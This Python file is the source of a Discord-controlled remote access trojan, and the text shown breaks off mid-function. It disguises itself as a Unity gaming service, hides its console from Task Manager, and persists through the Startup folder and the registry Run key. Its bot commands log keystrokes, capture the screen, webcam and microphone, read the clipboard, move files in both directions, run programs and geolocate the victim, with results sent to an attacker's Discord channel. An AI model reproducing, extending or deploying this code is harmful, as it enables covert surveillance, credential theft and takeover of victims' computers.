import discord
from discord.ext import commands
from pynput import keyboard
import platform
import psutil
import socket
import subprocess
import requests
import pyautogui
import sounddevice as sd
from scipy.io.wavfile import write
import ctypes
import time
import os
import cv2
import numpy as np
import uuid
import winreg
import shutil
import sys
from threading import Thread
import webbrowser
import pyperclip
from cryptography.fernet import Fernet
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import winsound
import schedule

TOKEN = '0' 
CHANNEL_ID = 0  

PC_ID = f"{socket.gethostname()}_{str(uuid.uuid4())[:8]}"
active_pcs = {}

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

keylog_running = False
keylog_buffer = []
keylog_listener = None
encryption_key = Fernet.generate_key()
cipher = Fernet(encryption_key)

def show_popup_message(message, title="Unity Gaming Services - Error", icon=1):
    ctypes.windll.user32.MessageBoxW(0, message, title, icon)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if is_admin():
        return True
    channel = bot.get_channel(CHANNEL_ID)
    try:
        script_path = os.path.abspath(__file__)
        python_exe = sys.executable
        ctypes.windll.shell32.ShellExecuteW(None, "runas", python_exe, f'"{script_path}"', None, 1)
        print("Relaunching with admin privileges...")
        if channel and bot.is_ready():
            bot.loop.create_task(channel.send(f"[{PC_ID}] Attempting to relaunch with admin privileges..."))
        time.sleep(2)
        sys.exit(0)
    except Exception as e:
        error_msg = f"[{PC_ID}] Failed to elevate privileges: {e}. Continuing in non-admin mode."
        print(error_msg)
        if channel and bot.is_ready():
            bot.loop.create_task(channel.send(error_msg))
        return False

def is_task_manager_running():
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] and proc.info['name'].lower() == "taskmgr.exe":
            return True
    return False

def hide_console_window():
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd != 0:
        ctypes.windll.user32.ShowWindow(hwnd, 0)

def show_console_window():
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd != 0:
        ctypes.windll.user32.ShowWindow(hwnd, 5)

def add_to_startup():
    channel = bot.get_channel(CHANNEL_ID)
    script_path = os.path.abspath(__file__)
    if not is_admin():
        error_msg = f"[{PC_ID}] Cannot add to startup: Admin privileges required."
        print(error_msg)
        if channel and bot.is_ready():
            bot.loop.create_task(channel.send(error_msg))
        return
    try:
        startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup", "UnityMultiplayerService.py")
        shutil.copy(script_path, startup_path)
        ctypes.windll.kernel32.SetFileAttributesW(startup_path, 0x02)
        success_msg = f"[{PC_ID}] Added to Startup folder: {startup_path}"
        print(success_msg)
        if channel and bot.is_ready():
            bot.loop.create_task(channel.send(success_msg))
    except PermissionError as e:
        error_msg = f"[{PC_ID}] Failed to add to Startup folder: Permission denied. Attempting registry method..."
        print(error_msg)
        if channel and bot.is_ready():
            bot.loop.create_task(channel.send(error_msg))
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "UnityMultiplayerService", 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
            winreg.CloseKey(key)
            success_msg = f"[{PC_ID}] Added to registry for startup."
            print(success_msg)
            if channel and bot.is_ready():
                bot.loop.create_task(channel.send(success_msg))
        except Exception as e:
            error_msg = f"[{PC_ID}] Failed to add to registry: {e}"
            print(error_msg)
            if channel and bot.is_ready():
                bot.loop.create_task(channel.send(error_msg))
    except Exception as e:
        error_msg = f"[{PC_ID}] Unexpected error in add_to_startup: {e}"
        print(error_msg)
        if channel and bot.is_ready():
            bot.loop.create_task(channel.send(error_msg))

def task_manager_watcher():
    was_running = False
    channel = bot.get_channel(CHANNEL_ID)
    while True:
        running = is_task_manager_running()
        if running and not was_running:
            hide_console_window()
            was_running = True
            if channel and bot.is_ready():
                try:
                    bot.loop.create_task(channel.send(f"[{PC_ID}] Task Manager opened on PC."))
                except:
                    pass
        elif not running and was_running:
            show_console_window()
            was_running = False
        time.sleep(1)

def process_watcher():
    my_pid = os.getpid()
    channel = bot.get_channel(CHANNEL_ID)
    while True:
        if not psutil.pid_exists(my_pid):
            if channel and bot.is_ready():
                try:
                    bot.loop.create_task(channel.send(f"[{PC_ID}] Bot process was terminated (possibly via Task Manager)."))
                except:
                    pass
            break
        time.sleep(5)

def is_command_for_pc(target_pc_id):
    return target_pc_id is None or target_pc_id == PC_ID

@bot.command(name="listpcs")
async def list_pcs(ctx):
    if not active_pcs:
        await ctx.send(f"[{PC_ID}] No PCs are currently connected.")
        return
    msg = "**Connected PCs:**\n"
    for pc_id, info in active_pcs.items():
        msg += (
            f"PC ID: {pc_id}\n"
            f"PC Name: {info['name']}\n"
            f"Local IP: {info['local_ip']}\n"
            f"Public IP: {info['public_ip']}\n"
            f"Location: {info['city']}, {info['country']}\n\n"
        )
    await ctx.send(msg)

@bot.command(name="connect")
async def connect(ctx, source_pc_id: str, target_pc_id: str, *, message: str):
    if source_pc_id != PC_ID:
        return
    if target_pc_id not in active_pcs:
        await ctx.send(f"[{PC_ID}] Target PC {target_pc_id} is not connected.")
        return
    await ctx.send(f"[{PC_ID}] Sending message to {target_pc_id}: {message}")
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        await channel.send(f"[{PC_ID} -> {target_pc_id}] Message: {message}")

@bot.command(name="msg")
async def popup_message(ctx, target_pc_id: str = None, *, message: str):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        await ctx.send(f"[{PC_ID}] Displaying message on PC: {message}")
        show_popup_message(message, "Unity Gaming Services - Notification")
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

@bot.command(name="sysinfo")
async def system_info(ctx, target_pc_id: str = None):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        pc_name = socket.gethostname()
        local_ip = socket.gethostbyname(pc_name)
        try:
            ip_data = requests.get("http://ip-api.com/json").json()
            public_ip = ip_data.get("query", "N/A")
            country = ip_data.get("country", "N/A")
            city = ip_data.get("city", "N/A")
        except:
            public_ip = "Unavailable"
            country = "Unavailable"
            city = "Unavailable"

        uname = platform.uname()
        os_info = f"Operating System: {uname.system} {uname.release} (Version: {uname.version})"
        cpu_info = f"Processor: {uname.processor}"
        memory = psutil.virtual_memory()
        memory_info = f"Memory: {memory.total // (1024 ** 3)} GB (Available: {memory.available // (1024 ** 3)} GB)"

        sysinfo_message = (
            f"[{PC_ID}] **System Information for {pc_name}:**\n"
            f"Local IP: {local_ip}\n"
            f"Public IP: {public_ip}\n"
            f"Location: {city}, {country}\n\n"
            f"{os_info}\n"
            f"{cpu_info}\n"
            f"{memory_info}"
        )
        await ctx.send(sysinfo_message)
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

@bot.command(name="screenshot")
async def take_screenshot(ctx, target_pc_id: str = None):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        screenshot_path = "screenshot.png"
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)
        await ctx.send(f"[{PC_ID}] Here is the screenshot:", file=discord.File(screenshot_path))
        os.remove(screenshot_path)
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred while taking the screenshot: {e}")

@bot.command(name="startaudio")
async def start_audio(ctx, target_pc_id: str = None):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        channels = 1
        duration = 10
        samplerate = 44100
        await ctx.send(f"[{PC_ID}] Starting audio recording...")
        audio = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=channels)
        sd.wait()
        audio_path = "recorded_audio.wav"
        write(audio_path, samplerate, audio)
        await ctx.send(f"[{PC_ID}] Here is the recorded audio:", file=discord.File(audio_path))
        os.remove(audio_path)
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

@bot.command(name="shutdown")
async def shutdown(ctx, target_pc_id: str = None):
    if not is_command_for_pc(target_pc_id):
        return
    await ctx.send(f"[{PC_ID}] Shutting down the PC...")
    os.system("shutdown /s /t 1")

@bot.command(name="restart")
async def restart(ctx, target_pc_id: str = None):
    if not is_command_for_pc(target_pc_id):
        return
    await ctx.send(f"[{PC_ID}] Restarting the PC...")
    os.system("shutdown /r /t 1")

@bot.command(name="logout")
async def logout(ctx, target_pc_id: str = None):
    if not is_command_for_pc(target_pc_id):
        return
    await ctx.send(f"[{PC_ID}] Logging out the user...")
    os.system("shutdown /l")

@bot.command(name="lock")
async def lock_screen(ctx, target_pc_id: str = None):
    if not is_command_for_pc(target_pc_id):
        return
    await ctx.send(f"[{PC_ID}] Locking the PC screen...")
    os.system("rundll32.exe user32.dll,LockWorkStation")

@bot.command(name="commands")
async def custom_help(ctx):
    help_message = (
        f"[{PC_ID}] **Available Commands:**\n"
        "- `!listpcs`: Lists all connected PCs.\n"
        "- `!connect <source_pc_id> <target_pc_id> <message>`: Sends a message from one PC to another.\n"
        "- `!msg [<pc_id>] <message>`: Displays a pop-up message on the specified PC.\n"
        "- `!sysinfo [<pc_id>]`: Displays system information for the specified PC.\n"
        "- `!screenshot [<pc_id>]`: Takes a screenshot of the specified PC's screen.\n"
        "- `!startaudio [<pc_id>]`: Records 10 seconds of audio on the specified PC.\n"
        "- `!shutdown [<pc_id>]`: Shuts down the specified PC.\n"
        "- `!restart [<pc_id>]`: Restarts the specified PC.\n"
        "- `!logout [<pc_id>]`: Logs out the current user on the specified PC.\n"
        "- `!lock [<pc_id>]`: Locks the screen of the specified PC.\n"
        "- `!webcam [<pc_id>]`: Takes a picture using the specified PC's webcam.\n"
        "- `!activity [<pc_id>]`: Shows currently running processes on the specified PC.\n"
        "- `!open [<pc_id>] <program>`: Opens a specified program on the specified PC.\n"
        "- `!close [<pc_id>] <program>`: Closes a specified program on the specified PC.\n"
        "- `!tasklist [<pc_id>]`: Lists running tasks on the specified PC.\n"
        "- `!userlist [<pc_id>]`: Lists logged in users on the specified PC.\n"
        "- `!keylog [<pc_id>] start|stop`: Starts or stops keylogging on the specified PC.\n"
        "- `!diskinfo [<pc_id>]`: Displays disk usage information for the specified PC.\n"
        "- `!opentab [<pc_id>] <url>`: Opens a browser tab with the specified URL on the specified PC.\n"
        "- `!closetab [<pc_id>] [browser]`: Closes all tabs for the specified browser (or all browsers) on the specified PC.\n"
        "- `!powerstatus [<pc_id>]`: Checks the power status (battery level, AC power) of the specified PC.\n"
        "- `!network [<pc_id>]`: Shows network statistics (bytes sent/received, active connections) for the specified PC.\n"
        "- `!cpuusage [<pc_id>]`: Monitors CPU usage in real-time on the specified PC.\n"
        "- `!listfiles [<pc_id>] <directory>`: Lists files and directories in the specified path on the specified PC.\n"
        "- `!download [<pc_id>] <file_path>`: Downloads a specified file from the specified PC.\n"
        "- `!upload [<pc_id>] <destination_path>`: Uploads a file to the specified PC from a Discord attachment.\n"
        "- `!screenrecord [<pc_id>] <duration>`: Records the screen for a specified duration on the specified PC.\n"
        "- `!webcamvideo [<pc_id>] <duration>`: Records a short video from the webcam on the specified PC.\n"
        "- `!micstream [<pc_id>] <duration>`: Streams live audio to a Discord voice channel from the specified PC.\n"
        "- `!cloak [<pc_id>]`: Makes the bot process less detectable by renaming it (requires admin).\n"
        "- `!selfdestruct [<pc_id>]`: Removes the bot from the system, including startup entries (requires admin).\n"
        "- `!encryptlogs [<pc_id>]`: Encrypts keylogs before sending them.\n"
        "- `!schedule [<pc_id>] <command> <time>`: Schedules a command to run at a specific time on the specified PC.\n"
        "- `!clip [<pc_id>] [text]`: Retrieves or sets the clipboard contents on the specified PC.\n"
        "- `!notify [<pc_id>] <event>`: Notifies the Discord channel when specific events occur on the specified PC.\n"
        "- `!play [<pc_id>] <sound_file>`: Plays a .wav sound file on the specified PC.\n"
        "- `!wallpaper [<pc_id>] <image_url>`: Changes the desktop wallpaper on the specified PC.\n"
        "- `!messagebox [<pc_id>] <type> <message>`: Displays a customizable message box on the specified PC."
    )
    await ctx.send(help_message)

@bot.command(name="webcam")
async def webcam(ctx, target_pc_id: str = None):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        await ctx.send(f"[{PC_ID}] Capturing webcam photo...")
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        cam.release()
        if not ret:
            await ctx.send(f"[{PC_ID}] Failed to access the webcam.")
            return
        photo_path = "webcam_photo.png"
        cv2.imwrite(photo_path, frame)
        await ctx.send(file=discord.File(photo_path))
        os.remove(photo_path)
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

@bot.command(name="activity")
async def activity(ctx, target_pc_id: str = None):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name']):
            processes.append(f"{proc.info['pid']}: {proc.info['name']}")
        msg = "\n".join(processes[:50])
        if not msg:
            msg = "No running processes found."
        await ctx.send(f"[{PC_ID}] **Running processes (up to 50):**\n{msg}")
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

@bot.command(name="open")
async def open_program(ctx, target_pc_id: str = None, *, program: str):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        subprocess.Popen(program)
        await ctx.send(f"[{PC_ID}] Opened program: {program}")
    except Exception as e:
        await ctx.send(f"[{PC_ID}] Could not open program '{program}': {e}")

@bot.command(name="close")
async def close_program(ctx, target_pc_id: str = None, *, program: str):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        killed = False
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] and program.lower() in proc.info['name'].lower():
                proc.kill()
                killed = True
        if killed:
            await ctx.send(f"[{PC_ID}] Closed program(s) matching: {program}")
        else:
            await ctx.send(f"[{PC_ID}] No program found matching: {program}")
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

@bot.command(name="tasklist")
async def tasklist(ctx, target_pc_id: str = None):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        tasks = []
        for proc in psutil.process_iter(['pid', 'name']):
            tasks.append(f"{proc.info['pid']}: {proc.info['name']}")
        msg = "\n".join(tasks[:50])
        if not msg:
            msg = "No tasks found."
        await ctx.send(f"[{PC_ID}] **Task List (up to 50):**\n{msg}")
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

@bot.command(name="userlist")
async def userlist(ctx, target_pc_id: str = None):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        users = psutil.users()
        msg = "\n".join([f"{u.name} (started at {time.ctime(u.started)})" for u in users])
        if not msg:
            msg = "No users logged in."
        await ctx.send(f"[{PC_ID}] **Logged in users:**\n{msg}")
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

def on_key_press(key):
    global keylog_buffer
    try:
        keylog_buffer.append(key.char)
    except AttributeError:
        keylog_buffer.append(f"[{key.name}]")

@bot.command(name="keylog")
async def keylog(ctx, target_pc_id: str = None, action: str = None):
    if not is_command_for_pc(target_pc_id):
        return
    global keylog_running, keylog_listener, keylog_buffer
    if action.lower() == "start":
        if keylog_running:
            await ctx.send(f"[{PC_ID}] Keylogger is already running.")
            return
        keylog_buffer = []
        keylog_listener = keyboard.Listener(on_press=on_key_press)
        keylog_listener.start()
        keylog_running = True
        await ctx.send(f"[{PC_ID}] Keylogger started.")
    elif action.lower() == "stop":
        if not keylog_running:
            await ctx.send(f"[{PC_ID}] Keylogger is not running.")
            return
        keylog_listener.stop()
        keylog_running = False
        log_text = "".join(keylog_buffer)
        if not log_text:
            log_text = "No keys were logged."
        log_file = "keylog.txt"
        with open(log_file, "w", encoding="utf-8") as f:
            f.write(log_text)
        await ctx.send(f"[{PC_ID}] Keylogger stopped. Here is the log:", file=discord.File(log_file))
        os.remove(log_file)
    else:
        await ctx.send(f"[{PC_ID}] Invalid action. Use `!keylog [<pc_id>] start` or `!keylog [<pc_id>] stop`.")

@bot.command(name="diskinfo")
async def disk_info(ctx, target_pc_id: str = None):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        disk_info = []
        for partition in psutil.disk_partitions():
            usage = psutil.disk_usage(partition.mountpoint)
            disk_info.append(
                f"{partition.mountpoint} Total: {usage.total // (1024 ** 3)}GB, "
                f"Used: {usage.used // (1024 ** 3)}GB, Free: {usage.free // (1024 ** 3)}GB"
            )
        msg = "\n".join(disk_info) if disk_info else "No disk information available."
        await ctx.send(f"[{PC_ID}] **Disk Information:**\n{msg}")
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

@bot.command(name="opentab")
async def open_tab(ctx, target_pc_id: str = None, *, url: str):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        webbrowser.open(url)
        await ctx.send(f"[{PC_ID}] Opened browser tab: {url}")
    except Exception as e:
        await ctx.send(f"[{PC_ID}] Could not open browser tab: {e}")

@bot.command(name="closetab")
async def close_tab(ctx, target_pc_id: str = None, *, browser: str = None):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        browser = browser.lower() if browser else None
        browser_processes = {
            'chrome': ['chrome.exe', 'msedge.exe'],
            'firefox': ['firefox.exe'],
            'edge': ['msedge.exe'],
            'safari': ['safari.exe'],
            'opera': ['opera.exe']
        }
        killed = False
        for proc in psutil.process_iter(['name']):
            proc_name = proc.info['name'].lower() if proc.info['name'] else ''
            if browser:
                if any(proc_name == b for b in browser_processes.get(browser, [])):
                    proc.kill()
                    killed = True
            else:
                if any(proc_name in b for sublist in browser_processes.values() for b in sublist):
                    proc.kill()
                    killed = True
        if killed:
            await ctx.send(f"[{PC_ID}] Closed browser tabs for: {browser or 'all browsers'}")
        else:
            await ctx.send(f"[{PC_ID}] No matching browser processes found for: {browser or 'any browser'}")
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

@bot.command(name="powerstatus")
async def power_status(ctx, target_pc_id: str = None):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        battery = psutil.sensors_battery()
        if battery:
            percent = battery.percent
            plugged = "Yes" if battery.power_plugged else "No"
            await ctx.send(f"[{PC_ID}] Battery: {percent}%, Plugged in: {plugged}")
        else:
            await ctx.send(f"[{PC_ID}] No battery information available (likely a desktop PC).")
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

@bot.command(name="network")
async def network_info(ctx, target_pc_id: str = None):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        io_counters = psutil.net_io_counters()
        connections = len(psutil.net_connections())
        msg = (
            f"[{PC_ID}] **Network Information:**\n"
            f"Bytes Sent: {io_counters.bytes_sent // (1024 ** 2)}MB\n"
            f"Bytes Received: {io_counters.bytes_recv // (1024 ** 2)}MB\n"
            f"Active Connections: {connections}"
        )
        await ctx.send(msg)
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

@bot.command(name="cpuusage")
async def cpu_usage(ctx, target_pc_id: str = None):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        usage = psutil.cpu_percent(interval=1)
        await ctx.send(f"[{PC_ID}] CPU Usage: {usage}%")
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

@bot.command(name="listfiles")
async def list_files(ctx, target_pc_id: str = None, *, directory: str):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        if not os.path.exists(directory):
            await ctx.send(f"[{PC_ID}] Directory not found: {directory}")
            return
        files = os.listdir(directory)
        msg = "\n".join(files[:50]) if files else "Directory is empty."
        await ctx.send(f"[{PC_ID}] Files in {directory}:\n{msg}")
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

@bot.command(name="download")
async def download_file(ctx, target_pc_id: str = None, *, file_path: str):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        if not os.path.exists(file_path):
            await ctx.send(f"[{PC_ID}] File not found: {file_path}")
            return
        if os.path.getsize(file_path) > 25 * 1024 * 1024:  # Discord free limit: 25MB
            await ctx.send(f"[{PC_ID}] File too large to send: {file_path}")
            return
        await ctx.send(f"[{PC_ID}] Sending file: {file_path}", file=discord.File(file_path))
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

@bot.command(name="upload")
async def upload_file(ctx, target_pc_id: str = None, *, destination_path: str):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        if not ctx.message.attachments:
            await ctx.send(f"[{PC_ID}] No file attached to upload.")
            return
        attachment = ctx.message.attachments[0]
        if attachment.size > 25 * 1024 * 1024:
            await ctx.send(f"[{PC_ID}] Attached file too large to upload.")
            return
        if not os.path.exists(destination_path):
            os.makedirs(destination_path, exist_ok=True)
        file_path = os.path.join(destination_path, attachment.filename)
        await attachment.save(file_path)
        await ctx.send(f"[{PC_ID}] File uploaded to: {file_path}")
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

@bot.command(name="screenrecord")
async def screen_record(ctx, target_pc_id: str = None, duration: int = 10):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        if duration > 30:
            await ctx.send(f"[{PC_ID}] Duration too long. Maximum is 30 seconds.")
            return
        await ctx.send(f"[{PC_ID}] Recording screen for {duration} seconds...")
        screen_size = pyautogui.size()
        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
        video_path = "screen_record.mp4"
        out = cv2.VideoWriter(video_path, fourcc, 20.0, screen_size)
        start_time = time.time()
        while time.time() - start_time < duration:
            img = pyautogui.screenshot()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            out.write(frame)
        out.release()
        if os.path.getsize(video_path) > 25 * 1024 * 1024:
            await ctx.send(f"[{PC_ID}] Video file too large to send.")
            os.remove(video_path)
            return
        await ctx.send(f"[{PC_ID}] Screen recording saved:", file=discord.File(video_path))
        os.remove(video_path)
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

@bot.command(name="webcamvideo")
async def webcam_video(ctx, target_pc_id: str = None, duration: int = 5):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        if duration > 15:
            await ctx.send(f"[{PC_ID}] Duration too long. Maximum is 15 seconds.")
            return
        await ctx.send(f"[{PC_ID}] Recording webcam video for {duration} seconds...")
        cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            await ctx.send(f"[{PC_ID}] Failed to access webcam.")
            return
        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
        video_path = "webcam_video.mp4"
        out = cv2.VideoWriter(video_path, fourcc, 20.0, (640, 480))
        start_time = time.time()
        while time.time() - start_time < duration:
            ret, frame = cam.read()
            if ret:
                out.write(frame)
        cam.release()
        out.release()
        if os.path.getsize(video_path) > 25 * 1024 * 1024:
            await ctx.send(f"[{PC_ID}] Video file too large to send.")
            os.remove(video_path)
            return
        await ctx.send(f"[{PC_ID}] Webcam video saved:", file=discord.File(video_path))
        os.remove(video_path)
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

@bot.command(name="micstream")
async def mic_stream(ctx, target_pc_id: str = None, duration: int = 10):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        if duration > 30:
            await ctx.send(f"[{PC_ID}] Duration too long. Maximum is 30 seconds.")
            return
        await ctx.send(f"[{PC_ID}] Audio streaming not fully implemented. Recording {duration}s audio instead...")
        channels = 1
        samplerate = 44100
        audio = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=channels)
        sd.wait()
        audio_path = "mic_stream.wav"
        write(audio_path, samplerate, audio)
        if os.path.getsize(audio_path) > 25 * 1024 * 1024:
            await ctx.send(f"[{PC_ID}] Audio file too large to send.")
            os.remove(audio_path)
            return
        await ctx.send(f"[{PC_ID}] Recorded audio:", file=discord.File(audio_path))
        os.remove(audio_path)
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

@bot.command(name="cloak")
async def cloak(ctx, target_pc_id: str = None):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        if not is_admin():
            await ctx.send(f"[{PC_ID}] Cannot cloak process: Admin privileges required.")
            return
        await ctx.send(f"[{PC_ID}] Process cloaking not fully implemented due to complexity. Process remains as is.")
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

@bot.command(name="selfdestruct")
async def self_destruct(ctx, target_pc_id: str = None):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        if not is_admin():
            await ctx.send(f"[{PC_ID}] Cannot self-destruct: Admin privileges required.")
            return
        startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup", "UnityMultiplayerService.py")
        if os.path.exists(startup_path):
            os.remove(startup_path)
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "UnityMultiplayerService")
            winreg.CloseKey(key)
        except:
            pass
        await ctx.send(f"[{PC_ID}] Self-destruct initiated. Bot removed.")
        script_path = os.path.abspath(__file__)
        os.remove(script_path)
        sys.exit(0)
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

@bot.command(name="encryptlogs")
async def encrypt_logs(ctx, target_pc_id: str = None):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        if not keylog_running:
            await ctx.send(f"[{PC_ID}] Keylogger is not running. Start it with `!keylog start`.")
            return
        keylog_listener.stop()
        keylog_running = False
        log_text = "".join(keylog_buffer)
        if not log_text:
            log_text = "No keys were logged."
        encrypted_log = cipher.encrypt(log_text.encode())
        log_file = "encrypted_keylog.bin"
        with open(log_file, "wb") as f:
            f.write(encrypted_log)
        await ctx.send(f"[{PC_ID}] Keylogger stopped. Encrypted log sent:", file=discord.File(log_file))
        await ctx.send(f"[{PC_ID}] Decryption key: {encryption_key.decode()}")
        os.remove(log_file)
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

@bot.command(name="schedule")
async def schedule_command(ctx, target_pc_id: str = None, command: str = None, time_str: str = None):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        if not command or not time_str:
            await ctx.send(f"[{PC_ID}] Usage: !schedule [<pc_id>] <command> <time>")
            return
        schedule.every().day.at(time_str).do(lambda: bot.loop.create_task(ctx.channel.send(f"[{PC_ID}] Executing scheduled command: {command}")))
        await ctx.send(f"[{PC_ID}] Scheduled {command} for {time_str}")
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

@bot.command(name="clip")
async def clipboard(ctx, target_pc_id: str = None, *, text: str = None):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        if text:
            pyperclip.copy(text)
            await ctx.send(f"[{PC_ID}] Clipboard set to: {text}")
        else:
            content = pyperclip.paste()
            await ctx.send(f"[{PC_ID}] Clipboard contents: {content or 'Empty'}")
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

class FileEventHandler(FileSystemEventHandler):
    def __init__(self, channel):
        self.channel = channel
    def on_modified(self, event):
        if not event.is_directory:
            bot.loop.create_task(self.channel.send(f"[{PC_ID}] File modified: {event.src_path}"))

@bot.command(name="notify")
async def notify(ctx, target_pc_id: str = None, *, event: str):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        if event.lower() == "file":
            observer = Observer()
            event_handler = FileEventHandler(ctx.channel)
            observer.schedule(event_handler, path=os.path.expanduser("~"), recursive=False)
            observer.start()
            await ctx.send(f"[{PC_ID}] Started file modification notifications in user directory.")
        else:
            await ctx.send(f"[{PC_ID}] Unsupported event type. Use 'file' for file modification notifications.")
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

@bot.command(name="play")
async def play_sound(ctx, target_pc_id: str = None, *, sound_file: str):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        if not os.path.exists(sound_file):
            await ctx.send(f"[{PC_ID}] Sound file not found: {sound_file}")
            return
        if not sound_file.lower().endswith('.wav'):
            await ctx.send(f"[{PC_ID}] Only .wav files are supported.")
            return
        winsound.PlaySound(sound_file, winsound.SND_FILENAME)
        await ctx.send(f"[{PC_ID}] Playing sound: {sound_file}")
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

@bot.command(name="wallpaper")
async def wallpaper(ctx, target_pc_id: str = None, *, image_url: str):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        response = requests.get(image_url)
        if response.status_code != 200:
            await ctx.send(f"[{PC_ID}] Failed to download image.")
            return
        image_path = "wallpaper.jpg"
        with open(image_path, "wb") as f:
            f.write(response.content)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(image_path), 3)
        await ctx.send(f"[{PC_ID}] Wallpaper changed to: {image_url}")
        os.remove(image_path)
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

@bot.command(name="messagebox")
async def message_box(ctx, target_pc_id: str = None, msg_type: str = None, *, message: str):
    if not is_command_for_pc(target_pc_id):
        return
    try:
        msg_types = {
            "info": 0x40,  # MB_ICONINFORMATION
            "warning": 0x30,  # MB_ICONWARNING
            "error": 0x10,  # MB_ICONERROR
        }
        icon = msg_types.get(msg_type.lower(), 0x40) if msg_type else 0x40
        await ctx.send(f"[{PC_ID}] Displaying {msg_type or 'info'} message box: {message}")
        show_popup_message(message, "Unity Gaming Services - Notification", icon)
    except Exception as e:
        await ctx.send(f"[{PC_ID}] An error occurred: {e}")

@bot.event
async def on_ready():
    pc_name = socket.gethostname()
    local_ip = socket.gethostbyname(pc_name)
    try:
        ip_data = requests.get("http://ip-api.com/json").json()
        public_ip = ip_data.get("query", "N/A")
        country = ip_data.get("country", "N/A")
        city = ip_data.get("city", "N/A")
    except:
        public_ip = "Unavailable"
        country = "Unavailable"
        city = "Unavailable"

    active_pcs[PC_ID] = {
        "name": pc_name,
